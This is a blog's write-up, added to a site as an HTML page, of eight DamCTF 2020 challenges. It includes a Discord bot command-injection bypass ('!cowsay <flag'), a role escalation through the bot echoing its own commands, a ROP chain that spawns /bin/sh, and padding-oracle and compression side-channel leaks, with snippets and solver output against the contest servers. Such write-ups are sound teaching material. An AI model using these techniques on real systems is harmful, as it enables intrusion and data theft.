@@ -1,0 +1,311 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
+<link rel=manifest href=/site.webmanifest>
+<link rel=mask-icon href=/safari-pinned-tab.svg color=#282a36>
+<meta name=msapplication-TileColor content="#2d89ef">
+<meta name=theme-color content="#282a36">
+<title>
+Writeup: DamCTF 2020 - nevi.dev
+</title><link rel=stylesheet href="/styles.min.3ccabd29c465dc8134033adc11b0759d36344d8cc9a2e2c84a26673954537ae2.css" integrity="sha256-PMq9KcRl3IE0AzrcEbB1nTY0TYzJouLISiZnOVRTeuI=">
+</head><body>
+<main>
+<article>
+<header>
+<h1>Writeup: DamCTF 2020</h1><time datetime=2020-10-13>2020-10-13</time>
+on <a href=/>nevi.dev</a>
+</header><ul>
+<li>Website: <a href=https://damctf.xyz/>https://damctf.xyz/</a></li><li>CTFTime: <a href=https://ctftime.org/event/1076>https://ctftime.org/event/1076</a></li></ul><p>First time playing in a long time, did much better than I expected!</p><h2 id=revschlage>rev/schlage</h2><blockquote>
+<p>I went to the hardware store yesterday and bought a new lock, for some reason it came on a flash drive. Can you figure out how to unlock it? I really need to get into my apartment.</p><p>Rather than traditional lock picks, you may find <a href=https://ghidra-sre.org/>this</a>, <a href=https://cloud.binary.ninja/>that</a>, or <a href=https://www.hex-rays.com/products/ida/support/download_freeware/>this other expensive-looking thing to be helpful</a>.</p><p><code>nc chals.damctf.xyz 31932</code></p><p>Downloads: <a href=schlage/schlage>schlage</a></p></blockquote><p>The pins have to be solved in a certain order, but it&rsquo;s easy enough to figure
+out through trial and error.</p><ul>
+<li>
+<p><strong>Pin 3</strong></p><pre tabindex=0><code>   d4e:       c7 45 f8 ef be ad de    mov    DWORD PTR [rbp-0x8],0xdeadbeef
+   [...]
+   d66:       e8 dc fc ff ff          call   a47 &lt;get_int&gt;
+   d6b:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax
+   d6e:       8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]
+   d71:       33 45 fc                xor    eax,DWORD PTR [rbp-0x4]
+   d74:       3d 37 13 37 13          cmp    eax,0x13371337
+   d79:       75 15                   jne    d90 &lt;do_pin3+0x80&gt;
+</code></pre><p>It gets an additional input, and checks if it equals <code>0x13371337</code> when XORed
+with <code>0xdeadbeef</code>.</p></li><li>
+<p><strong>Pin 1</strong></p><p>It initializes a few numbers, takes user input, XORs them all together, and
+checks if the result is equal to <code>0xee</code>. The correct input happens to be 99.</p></li><li>
+<p><strong>Pin 5</strong></p><pre tabindex=0><code>   ec2:       bf 42 42 42 42          mov    edi,0x42424242
+   ec7:       e8 b4 f9 ff ff          call   880 &lt;srand@plt&gt;
+   [...]
+   edd:       e8 65 fb ff ff          call   a47 &lt;get_int&gt;
+   ee2:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax
+   ee5:       e8 f6 f9 ff ff          call   8e0 &lt;rand@plt&gt;
+   eea:       39 45 fc                cmp    DWORD PTR [rbp-0x4],eax
+   eed:       75 15                   jne    f04 &lt;do_pin5+0x80&gt;
+</code></pre><p>It calls <code>srand(0x42424242)</code>, and checks if the user input equals the return
+value of <code>rand()</code>. <code>rand()</code> will always return the same number, 1413036362.</p></li><li>
+<p><strong>Pin 2</strong></p><pre tabindex=0><code>   f58:       e8 43 f9 ff ff          call   8a0 &lt;time@plt&gt;
+   f5d:       89 45 f8                mov    DWORD PTR [rbp-0x8],eax
+   [...]
+   f78:       8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]
+   f7b:       89 c6                   mov    esi,eax
+   f7d:       48 8d 3d 53 06 00 00    lea    rdi,[rip+0x653]        # 15d7 &lt;_IO_stdin_used+0x337&gt;
+   f84:       b8 00 00 00 00          mov    eax,0x0
+   f89:       e8 d2 f8 ff ff          call   860 &lt;printf@plt&gt;
+   f8e:       8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]
+   f91:       89 c7                   mov    edi,eax
+   f93:       e8 e8 f8 ff ff          call   880 &lt;srand@plt&gt;
+   [...]
+   fa9:       e8 99 fa ff ff          call   a47 &lt;get_int&gt;
+   fae:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax
+   fb1:       e8 2a f9 ff ff          call   8e0 &lt;rand@plt&gt;
+   fb6:       39 45 fc                cmp    DWORD PTR [rbp-0x4],eax
+   fb9:       75 15                   jne    fd0 &lt;do_pin2+0xbe&gt;
+</code></pre><p>It calls <code>time()</code>, prints it, calls <code>srand()</code> with it, and compares the user
+input against the return value of <code>rand()</code>. It needs to be automated, but
+overall is verys similar to the previous stage.</p></li><li>
+<p><strong>Pin 4</strong></p><p>This stage calls <code>rand()</code>, and does a bunch of operations on it. The return
+value of this call is known, since the RNG has been seeded in the previous
+stage. The operations are something like this:</p><pre tabindex=0><code>int a, c, d;
+c = rand();
+d = 0x66666667;
+a = c;
+d = ((long long int) d * a) &gt;&gt; 32;
+d &gt;&gt;= 2;
+a = c;
+a &gt;&gt;= 0x1f;
+d -= a;
+a = d;
+a &lt;&lt;= 2;
+a += d;
+a += a;
+c -= a;
+d = c;
+a = d + 0x41;
+</code></pre><p>Then, it checks if the sum of each character in the input string XORed with
+<code>a</code>, equals <code>0x123</code>. Eg. we can send <code>((0x123 // 3) ^ a)</code> repeated three
+times.</p></li></ul><p>Solution: <a href=schlage/solution.py>solution.py</a> <a href=schlage/rand.c>rand.c</a></p><pre tabindex=0><code>$ python3 solution.py
+[+] Opening connection to chals.damctf.xyz on port 31932: Done
+[+] Starting local process &#39;./rand&#39;: pid 19189
+[*] Process &#39;./rand&#39; stopped with exit code 0 (pid 19189)
+[+] Receiving all data: Done (957B)
+[*] Closed connection to chals.damctf.xyz port 31932
+[+] b&#39;dam{p1ck1NG_l0Ck5_w1TH_gdB}&#39;
+</code></pre><h2 id=miscelectric-bovine>misc/electric-bovine</h2><blockquote>
+<p>Do androids dream of electric bovine? Find out on my new <a href=https://discord.gg/dszJ4KV>Discord server</a>!</p></blockquote><p>Upon joining the server, a bot called &ldquo;Secure Permissions Bot&rdquo; sends you a DM,
+saying &ldquo;Welcome! You may run !help here to find out about me.&rdquo;</p><pre tabindex=0><code>&gt; !help
+Help Menu
+-------------
+ - !help    Displays this message.
+ - !ping    Pong??
+ - !about    Displays information about this bot.
+ - !resource    Links you to a random resource.
+ - !cowsay &lt;text&gt;    Displays your text in cowsay format. Requires greater permissions than user in the guild to use.
+ - !list_users     Lists all users in channel.
+ - !send_msg &lt;text&gt;    (when used from DMs) sends a message in the #botspam channel in the guild.
+ - !role_add &lt;user&gt; &lt;role&gt;    Attempt to add role to user. May only be used from within guild.
+&gt; !about
+About Me
+----------
+I&#39;m a bot. On the weekends, I&#39;m a huge fan.
+My name is Secure Permissions Bot#7351
+You may find my source code here:https://beav.es/o7y
+You may find my bot token here https://beav.es/o7r
+License: None.
+</code></pre><p>The <a href=https://gist.github.com/dunklastarn/d3e3ca30bb4f476221bf42faebb19a12>bot&rsquo;s source code</a>
+shows the implementation of all its commands, the most interesting ones being
+<code>!send_msg</code>, <code>!role_add</code>, and <code>!cowsay</code>.</p><p>For future reference the bot has roles &ldquo;private&rdquo; and &ldquo;bot&rdquo;, and all new users
+have the role &ldquo;user&rdquo;, and the initial goal seems to be to obtain role &ldquo;private&rdquo;.</p><p>However, the bot does not accept <code>!role_add</code> from the user. In order to get
+around that, we can use the fact that, unlike the superior messaging platform
+IRC, bots in Discord can see their own messages. Combine that with the command
+<code>!send_msg</code>, and we can get the bot to call its commands.</p><p>There is some authentication in the <code>!role_add</code> command, which checks the target
+user&rsquo;s nick, current roles, the caller&rsquo;s roles, and the target role. There are
+multiple ways to get around this, including changing your nick to <code>private</code> or
+<code>target_role.id + int(str(user.discriminator) * 4)</code>. After changing your user&rsquo;s
+nick, call the bot to obtain the &ldquo;private&rdquo; role.</p><pre tabindex=0><code>&gt; !send_msg !role_add @nevivurn 0007631280872263516380
+Hmmm... nevivurn wants to add role private. Interesting. . .
+Granted role private to member nevivurn. Well Done!
+</code></pre><p>With the &ldquo;private&rdquo; role, we can call <code>!cowsay</code>, whose implementation is as
+follows:</p><pre tabindex=0><code>for char in arg:
+    if char in &#34; `1234567890-=~!@#$%^&amp;*()_+[]\\{}|;&#39;:\&#34;,./?&#34;:
+        await message.author.send(&#34;Invalid character sent. Quitting.&#34;)
+        return
+
+cow = &#34;```\n&#34; + os.popen(&#34;cowsay &#34; + arg).read() + &#34;\n```&#34;
+</code></pre><p>The code is vulnerable to command injection, but it filters out most special
+characters, making useful injections difficult. However, the filter does not
+block angle brackets <code>&lt;></code>, which allows us to redirect inputs:</p><pre tabindex=0><code>&gt; !cowsay &lt;flag
+ __________________________
+&lt; dam{discord_su_do_speen} &gt;
+ --------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+</code></pre><h2 id=cryptosemihonest>crypto/semihonest</h2><blockquote>
+<p>OT is secure
+I hope you will not break it
+Don&rsquo;t be malicious</p><p>Remote running at chals.damctf.xyz 30332</p><p>Downloads: <a href=semihonest/semihonestclient.py>semihonestclient.py</a></p></blockquote><p>Reading the source code, the server and client seem to be performing a
+Diffie-Hellman key exchange, except the client is supposed to send two numbers,
+one of them being a random number.</p><p>By generating two different DH public keys (the server complains if you send the
+same one twice), the server will helpfully encrypt the flag using the two shared
+keys. The client can then compute the shared keys on its end, decrypt the two
+ciphertexts, and XOR them together to obtain the flag.</p><p>Solution: <a href=semihonest/solution.py>solution.py</a></p><pre tabindex=0><code>$ python3 solution.py chals.damctf.xyz 30332
+*** Welcome to my Oblivious Transfer server! ***
+[...]
+Decrypted text:
+b&#39;dam{w0w_1_gues5_h0n3sty_15nt_1mp0rt4nT_T0_y0u}\n&#39;
+</code></pre><h2 id=pwnallokay>pwn/allokay</h2><blockquote>
+<p>Every CTF needs a BabyPWN. Time to ROP!</p><p>nc chals.damctf.xyz 32575</p><p>Downloads: <a href=allokay/allokay>allokay</a></p></blockquote><p>This was my first ever pwn challenge!</p><p>The program first reads up to 20 characters of user input into a buffer at
+<code>0x6010a0</code>, passing the resulting string to <code>atoi</code> to obtain the number of input
+arguments:</p><pre tabindex=0><code>  40086d:       be 14 00 00 00          mov    esi,0x14
+  400872:       48 8d 3d 27 08 20 00    lea    rdi,[rip+0x200827]        # 6010a0 &lt;buffer&gt;
+  400879:       e8 b2 fd ff ff          call   400630 &lt;fgets@plt&gt;
+  40087e:       48 8d 3d 1b 08 20 00    lea    rdi,[rip+0x20081b]        # 6010a0 &lt;buffer&gt;
+  400885:       e8 c6 fd ff ff          call   400650 &lt;atoi@plt&gt;
+</code></pre><p>Then, in <code>get_input</code>, it reads nubmers into an array. However, the buffer
+allocated to hold the number is too small:</p><pre tabindex=0><code>  4007a6:       8b 45 dc                mov    eax,DWORD PTR [rbp-0x24]
+  4007a9:       48 98                   cdqe
+  4007ab:       48 8d 50 0f             lea    rdx,[rax+0xf]
+  4007af:       b8 10 00 00 00          mov    eax,0x10
+  4007b4:       48 83 e8 01             sub    rax,0x1
+  4007b8:       48 01 d0                add    rax,rdx
+  4007bb:       b9 10 00 00 00          mov    ecx,0x10
+  4007c0:       ba 00 00 00 00          mov    edx,0x0
+  4007c5:       48 f7 f1                div    rcx
+  4007c8:       48 6b c0 10             imul   rax,rax,0x10
+  4007cc:       48 29 c4                sub    rsp,rax
+  4007cf:       48 89 e0                mov    rax,rsp
+</code></pre><p>This only allocates <code>(num + 30) // 15 * 15</code> bytes for <code>num</code> <code>long int</code>s.</p><p>Then, we can overwrite the return address (skipping the rest of the stack with
+<code>-</code>). There is a helpful <code>win</code> function that calls <code>execve</code> for us, and we can
+fit the <code>/bin/sh\x00</code> into the buffer initially used to get the number of
+arguments.</p><pre tabindex=0><code># prepare payload
+rop.call(elf.symbols.win, [elf.symbols.buffer + 3])
+payload = rop.chain()
+
+# populate buffer
+c.sendline(b&#39;14 /bin/sh\x00&#39;)
+# skip most of stack
+c.sendline(&#39;- &#39; * 11)
+
+# send payload as numbers
+for num in group(8, payload):
+    c.sendline(str(u64(num, sign=True)))
+
+c.sendline(&#39;cat flag&#39;)
+</code></pre><p>Solution: <a href=allokay/solution.py>solution.py</a></p><pre tabindex=0><code>$ python3 solution.py
+[*] &#39;./allokay&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Loaded 14 cached gadgets for &#39;allokay&#39;
+[+] Opening connection to chals.damctf.xyz on port 32575: Done
+[+] Receiving all data: Done (21B)
+[*] Closed connection to chals.damctf.xyz port 32575
+[+] b&#39;dam{4Re_u_A11_0cK4y}\n&#39;
+</code></pre><h2 id=cryptocbc-padding-oracle>crypto/cbc-padding-oracle</h2><blockquote>
+<p>You will be provided with an AES-CBC encryptor source code.</p><p>The code let you get the encrypted text of <code>AES_CBC_ENC(A*64 + flag + your_choice_of_input)</code>.</p><p>Also, the code let you check if your encrypted text is intact, in other words, it will decrypt your ciphertext input and will check the padding for the sanity check.</p><p>Under this condition, can you launch the padding oracle attack to this program to leak the flag?</p><p><a href=https://en.wikipedia.org/wiki/Padding_oracle_attack>A helpful resource</a></p><p><em>Our solution takes ~8 min, and the server timeout is 15min. If you disconnect, you can reconnect and continue your solution, the key is fixed.</em></p><p><code>nc chals.damctf.xyz 30327</code></p><p>Downloads: <a href=cbc-padding-oracle/cbc-padding-oracle.py>cbc-padding-oracle.py</a></p></blockquote><p>This is a straightforward CBC padding oracle challenge.</p><p>Solution: <a href=cbc-padding-oracle/solution.py>solution.py</a></p><pre tabindex=0><code>[+] Opening connection to chals.damctf.xyz on port 30327: Done
+[*] pad = 1; length = 96
+[*] pad = 2; length = 112
+[*] data: b&#39;p\xe8(\xfd\xec\x86dc\xa0n\x94\xf1b,\xb6\xd9qLZ\x84\xb8\xe4\xc4\x0f\xb8\x7f\xb3\x1b\xf5\xcb\x80\xe4i\x1a\\JS\xc9\xa4c\xc6\x01\x90 `\xc1\xd3~f?%\xee.\xf0\x1e9\x94\x17\x1a\xfe\xcc\xe2\xf5\xad\xcd?y\x0b\xc4\xb5\xea\xf0\xe3\x83\xe2\x8f{\xc5\xcct\xe7\x87\x06\xf3\x8f\xc9\xf1\x82\x08Kt\x06\xe7\xe4\xbe\xce;\xf2(\x1b\x9a\xce\x81\x80\x82\n:\xb9\xa9&gt;\xfdF&#39;
+[*] flag_len: 14
+[*] known: 1/16; current: 00000000000000000000000000003232
+[*] known: 2/16; current: 00000000000000000000000000093333
+[...]
+[*] known: 15/16; current: 74717d6b4f5f6224537c234f6d1a2020
+[+] b&#39;dam{_Or4Cl3_}\n&#39;
+</code></pre><h2 id=miscaes>misc/aes</h2><blockquote>
+<p>Absurd Encrypted Storage</p><p>Proof of Work requred to solve this challenge. Use generate.py to produce the relevant token and start the challenge.</p><p><em>This challenge uses the standard American English dictionary distributed with Ubuntu.</em></p><p><code>nc chals.damctf.xyz 30888</code></p><p>Downloads: <a href=aes/chal.py>chal.py</a> <a href=aes/generate.py>generate.py</a></p></blockquote><p>The server takes 1000 random words from the dictionary, randomly generates 1000
+documents that contain 1000 words (chosen randomly), generates an index, and
+encrypts the documents.</p><p>The server responds to word queries, taking an arbitrary number of words, by
+responding with all the encrypted documents that contain those words. The goal
+is to find 10 words that are included in the initial set of 1000 words.</p><blockquote>
+<p>Note: it turns out that the server will happily accept one word repeated 10
+times, though I failed to notice this during the CTF.</p></blockquote><p>The limiting factor is the number of queries, capped at 170 queries before the
+server terminates. This turns out to be extremely generous, as evidenced by the
+very rough math that follows.</p><p>The dictionary contains about 100000 words, so 1000 words is roughly 1% of the
+dictionary. If I were to select <code>N</code> random words from the dictionary, the
+probability that at least one of them is included in those 1000 words is
+<code>1 - (1 - 0.01)^N</code>. Let <code>N</code> be a nice, round number like 64, and the probability
+is about 50%.</p><p>We can easily check whether at least one word in a group of 64 words was
+included in the original 1000 words by sending all of them in a query. This
+consumes one query, and returns a bunch of documents if at least one word is a
+hit, nothing if there are no hits.</p><p>After checking whether a group of 64 words is included in the initial set,
+assuming there is only one hit, it takes exactly 6 queries to perform a binary
+search to isolate that word.</p><p>Taking it all together, it takes 10 &ldquo;good&rdquo; groups of 64 words 7 queries each
+(initial test + 6 for binary search), for a total of 70 queries if done
+perfectly. This means that in order to run of of queries before finding 10
+words, we must fail 99 times in the initial 64-word query, which happens about
+50% of the time. Thus, the probability of failing with this strategy is
+insigificant.</p><p>Solution: <a href=aes/solution.py>solution.py</a></p><pre tabindex=0><code>$ python3 solution.py
+[+] Opening connection to chals.damctf.xyz on port 30888: Done
+[+] solving proof-of-work: done
+[*] 64: False
+[...]
+[*] 64: True
+[*] 32: True
+[*] 16: False
+[*] 8: False
+[*] 4: True
+[*] 2: True
+[*] 1: False
+[+] success: Hieronymus&#39;s
+[...]
+[+] success: realm&#39;s
+[+] words: [&#34;Hieronymus&#39;s&#34;, &#34;phrenology&#39;s&#34;, &#39;pimientos&#39;, &#34;Katmai&#39;s&#34;, &#34;Elwood&#39;s&#34;, &#39;dumbwaiters&#39;, &#39;ruler&#39;, &#39;improper&#39;, &#39;fastenings&#39;, &#34;realm&#39;s&#34;]
+[+] Receiving all data: Done (29B)
+[*] Closed connection to chals.damctf.xyz port 30888
+[+] b&#39; dam{pLeaSe_c0m3_bACK_m1ke}\n\n&#39;
+</code></pre><h2 id=revtracing-into-the-night>rev/tracing-into-the-night</h2><blockquote>
+<p>All you have to do is type the right number.
+Easy right? Here, I&rsquo;ll do it first.
+Now it&rsquo;s your turn.</p><p>Downloads: <a href=tracing-into-the-night/trace>trace</a> <a href=tracing-into-the-night/tracing-into-the-night>tracing-into-the-night</a></p></blockquote><p>The program loads two big ingegers, hardcoded as strings, from memory. Then, it
+essentially does the following, using libgmp for bignum operations:</p><pre tabindex=0><code>N = big number 1
+C = big number 2
+input = input number
+a = 1
+
+while (input.something) {
+	a *= a
+	a %= N
+	if (input.somethingelse) {
+		a *= C
+		a %= N
+	}
+}
+
+print a.to_bytes
+</code></pre><p>Notice how all modification of <code>a</code> happens at exactly four points, all easy to
+locate in the trace by grepping for <code>mpz_mod</code> and <code>mpz_mul</code> calls. Once we have
+the operations performed on <code>a</code>, all that&rsquo;s left is to replay them:</p><pre tabindex=0><code>ans = gmpy2.mpz(1)
+
+for line in sys.stdin:
+    line = line.rstrip()
+    if line == &#39;401367&#39;:
+        ans *= ans
+        ans %= N
+    if line == &#39;4013e0&#39;:
+        ans *= C
+        ans %= N
+</code></pre><p>Solution: <a href=tracing-into-the-night/solution.py>solution.py</a></p><pre tabindex=0><code>$ grep -E &#39;gmpz_(mod|mul)&#39; trace | cut -d: -f1 | python3 solution.py
+b&#39;dam{and_1nto_d4ta_depend3ncy}\x01\x01&#39;
+</code></pre><h2 id=cryptoguess-secret>crypto/guess-secret</h2><blockquote>
+<p>Can you break my super secure and efficient communication method over the internet?</p><p><code>nc chals.damctf.xyz 30308</code></p><p>Downloads: <a href=guess-secret/guess-secret.py>guess-secret.py</a></p></blockquote><p>The server essentially computes <code>aes-ctr-encryt(deflate(flag + input))</code>, where
+<code>flag</code> is <code>dam\{[0-9a-f]{32}\}</code>.</p><p>Now, if <code>input</code> matches parts of the flag, the output of the compression would
+be slightly smaller, because repeated data compresses well. This allows us to
+leak the flag one letter at a time.</p><p>Solution: <a href=guess-secret/solution.py>solution.py</a></p><pre tabindex=0><code>$ python3 solution.py
+[+] Opening connection to chals.damctf.xyz on port 30308: Done
+[*] known: 9
+[*] known: 9f
+...
+[*] known: 9f64ee1d4a7d6d8fe9136c3e9a74fc76
+[+] damctf{9f64ee1d4a7d6d8fe9136c3e9a74fc76}
+</code></pre></article></main><footer>
+<hr>
+<small><a href=mailto:nevivurn@nevi.dev>email</a> | <a href=https://github.com/nevivurn>github</a><br>
+Content on this site is <a href=https://creativecommons.org/licenses/by/4.0/>CC-BY-4.0</a>.</small>
+</footer></body></html>
